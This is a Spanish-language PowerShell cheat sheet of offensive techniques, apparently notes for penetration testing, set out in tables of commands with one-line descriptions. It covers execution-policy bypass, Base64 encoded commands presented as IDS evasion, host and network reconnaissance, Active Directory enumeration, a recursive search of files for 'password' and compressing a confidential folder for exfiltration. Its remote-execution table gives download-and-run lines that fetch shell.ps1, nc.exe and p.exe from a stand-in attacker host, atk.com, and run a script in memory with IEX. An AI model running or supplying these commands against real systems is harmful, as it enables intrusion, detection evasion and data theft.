# Políticas

| **Comando / Técnica** | **Función**                                  | **Ejemplo de Sintaxis**                              |
| --------------------- | -------------------------------------------- | ---------------------------------------------------- |
| `Get-ExecutionPolicy` | Verifica la política actual.                 | `Get-ExecutionPolicy -List`                          |
| `Set-ExecutionPolicy` | Cambia la política (requiere Admin).         | `Set-ExecutionPolicy Bypass -Scope Process`          |
| `Bypass Execution`    | Ejecuta un script saltándose la política.    | `powershell.exe -ExecutionPolicy Bypass -File s.ps1` |
| `EncodedCommand`      | Ejecuta comandos en Base64 (evasión de IDS). | `powershell -enc SUVYIChOZXctT2JqZWN0...`            |
| `$PSVersionTable`     | Muestra la versión de PowerShell.            | `$PSVersionTable.PSVersion`                          |

# Recon

|**Parámetro / Cmdlet**|**Función**|**Ejemplo de Sintaxis**|
|---|---|---|
|`whoami /priv`|Muestra los privilegios del token actual.|`whoami /priv`|
|`Get-LocalUser`|Lista usuarios locales.|`Get-LocalUser \| Select-Object Name, Enabled`|
|`Get-WmiObject`|Obtiene información de parches/hotfixes.|`Get-WmiObject -Class "win32_quickfixengineering"`|
|`Get-Process`|Lista procesos y servicios activos.|`Get-Process \| Where-Object {$_.Description -ne ""}`|

# Red

| **Parámetro / Cmdlet** | **Función**                                    | **Ejemplo de Sintaxis**                                  |
| ---------------------- | ---------------------------------------------- | -------------------------------------------------------- |
| `Test-NetConnection`   | Escaneo de puertos básico (sustituto de nc).   | `Test-NetConnection -ComputerName 192.168.1.1 -Port 445` |
| `Get-NetIPAddress`     | Muestra la configuración de IP detallada.      | `Get-NetIPAddress -AddressFamily IPv4`                   |
| `Get-NetTCPConnection` | Lista conexiones y puertos abiertos (netstat). | `Get-NetTCPConnection -State Established`                |
| `DNS Enumeration`      | Resuelve un nombre de host.                    | `[System.Net.Dns]::GetHostAddresses("google.com")`       |

# Ejecución remota

| **Técnica**            | **Función**                                    | **Ejemplo de Sintaxis**                                                                     |
| ---------------------- | ---------------------------------------------- | ------------------------------------------------------------------------------------------- |
| `DownloadFile`         | Descarga un archivo a disco.                   | `(New-Object System.Net.WebClient).DownloadFile("http://atk.com/nc.exe", "C:\temp\nc.exe")` |
| `IEX (DownloadString)` | Ejecuta un script directamente en memoria.     | `IEX (New-Object System.Net.WebClient).DownloadString('http://atk.com/shell.ps1')`          |
| `Invoke-WebRequest`    | Descarga de archivos (similar a curl).         | `iwr -Uri http://atk.com/p.exe -OutFile C:\temp\p.exe`                                      |
| `Invoke-Command`       | Ejecuta comandos en una sesión remota (WinRM). | `Invoke-Command -ComputerName SRV01 -ScriptBlock {whoami}`                                  |
| `Enter-PSSession`      | Inicia una sesión interactiva remota.          | `Enter-PSSession -ComputerName Target_IP -Credential user`                                  |

# AD

| **Acción**        | **Función**                                      | **Ejemplo de Sintaxis**              |
| ----------------- | ------------------------------------------------ | ------------------------------------ |
| `Get-NetDomain`   | Obtiene información del dominio actual.          | `Get-NetDomain`                      |
| `Get-NetUser`     | Lista todos los usuarios del dominio.            | `Get-NetUser \| select cn, memberof` |
| `Get-NetComputer` | Lista las máquinas del dominio.                  | `Get-NetComputer -FullData`          |
| `Get-NetGroup`    | Lista grupos de seguridad.                       | `Get-NetGroup -GroupName "*Admin*"`  |
| `Find-LocalAdmin` | Busca máquinas donde el usuario actual es admin. | `Find-LocalAdminAccess`              |
| `Get-NetLoggedOn` | Muestra quién está logueado en una máquina.      | `Get-NetLoggedOn -ComputerName PC01` |

# Exfil
|**Comando**|**Función**|**Ejemplo de Sintaxis**|
|---|---|---|
|`Select-String`|Busca cadenas de texto (grep).|`dir -r \| Select-String "password"`|
|`Export-Csv`|Exporta resultados a formato CSV.|`Get-Process \| Export-Csv -Path ./procs.csv`|
|`ConvertTo-Json`|Convierte objetos a formato JSON para API.|`Get-Service \| ConvertTo-Json`|
|`Compress-Archive`|Comprime archivos para exfiltración.|`Compress-Archive -Path C:\Confidencial -DestinationPath C:\temp\data.zip`|